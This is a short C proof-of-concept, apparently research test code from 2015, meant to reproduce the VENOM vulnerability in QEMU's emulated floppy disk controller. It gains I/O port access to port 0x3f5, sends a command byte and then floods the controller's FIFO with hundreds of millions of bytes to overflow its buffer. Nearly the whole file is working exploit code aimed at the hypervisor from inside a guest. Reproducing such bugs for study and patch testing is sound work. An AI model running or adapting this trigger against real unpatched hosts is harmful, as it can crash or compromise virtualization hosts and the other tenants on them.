/*this is a test code
It's aim is to exploit and recreate possible Venom attack on QEMU before patch
6/2/2015  Yihao Zhang*/
#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define MAX_COUNT  500000000
void main(void){
        ioperm(0x3f5, 1, 1);
	printf("write spc_command to port\n");
        outb(SPC_COMMAND, FIFO);
        printf("write spc_command to portaa\n");
        int i,j;
        j = 0;
        printf("into loop\n");
        for(i=0; i<MAX_COUNT; i++ ){
                outb(j,0x3f5);
                j =(j+1)%100;
        }

}
